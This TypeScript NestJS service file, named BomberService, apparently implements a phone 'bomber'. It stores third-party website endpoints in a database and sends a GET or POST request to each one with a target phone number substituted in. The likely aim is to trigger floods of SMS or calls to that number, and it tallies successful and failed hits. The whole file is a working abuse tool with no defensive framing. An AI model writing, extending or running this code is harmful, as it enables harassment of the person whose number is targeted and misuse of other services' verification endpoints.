import { HttpService, Injectable } from '@nestjs/common';
import { InjectRepository } from '@nestjs/typeorm';
import * as FormData from "form-data";
import { DeepPartial, Repository } from 'typeorm';
import { CreateURLRequest } from './dto/create.URL.request';
import { Hosts } from './hosts.entity';

@Injectable()
export class BomberService {
    constructor(private httpService: HttpService,
        @InjectRepository(Hosts) private hostsRepo: Repository<Hosts>,
    ) { }
    private good: number = 0;
    private bad: number = 0;

    async startBomb(number: string) {
        const hosts = await this.hostsRepo.find({
            where: { validate: true }
        });

        for (const host of hosts) {
            if (host.method == 'POST') {
                await this.postRequest(host, number);
            }
            if (host.method == 'GET') {
                await this.getRequest(host, number);
            }
        }
        console.log('======================');
        console.log('good: ' + this.good);
        console.log('bad: ' + this.bad);
        console.log('======================');

        return true;
    }

    async addUrl(req: CreateURLRequest) {
        console.log(req)
        const hostData: DeepPartial<Hosts> = {
            name: req.name,
            accept: req.accept,
            url: req.url,
            method: req.method,
            сontentType: req.сontentType,
            paramName: req.paramName,
            plus: req.plus,
            data: req.data
        };

        const host = await this.hostsRepo.create(hostData);
        return await this.hostsRepo.save(host);
    }

    async postRequest(host: Hosts, number: string) {
        let body;
        if (host.сontentType && host.сontentType.indexOf("application/json")) {
            const phone = (host.plus ?? '') + number;
            body = Object.assign(JSON.parse(host.data), JSON.parse("{\"" + host.paramName + "\":\"" + phone + "\"}"));
        } else {
            body = `${host.paramName}=${host.plus ?? ''}${number}`;
        }
        try {
            const response = await this.httpService.post(
                host.url,
                body
                , {
                    headers: {
                        'Content-Type': host.сontentType,
                        'Accept': host.accept
                    }
                }
            ).toPromise();
            if (response.data.status === 'error' || response.data.error) {
                console.log(`####_BAD_####_##POST##_${host.name}_#${number}#`);
                this.bad++;
            } else {
                console.log(`####_GOOD_####_##POST##_${host.name}_#${number}#`);
                this.good++;
            }

        } catch (e) {
            console.log(`####_ERROR_####_##POST##_${host.name}_#${number}#`);
            this.bad++;
            console.log(e.response.data);
        }
    }

    async getRequest(host: Hosts, number: string) {
        try {
            const response = await this.httpService.get(
                host.url.replace('${phone}', host.plus + number)
            ).toPromise();

            if (response.data.status === 'error' || response.data.error) {
                console.log(`####_BAD_####_##GET##_${host.name}_#${number}#`);
                this.bad++;
            } else {
                console.log(`####_GOOD_####_##GET##_${host.name}_#${number}#`);
                this.good++;
            }
        } catch (e) {
            console.log(`####_ERROR_####_##GET##_${host.name}_#${number}#`);
            this.bad++;
            console.log(e.response.data);
        }
    }


}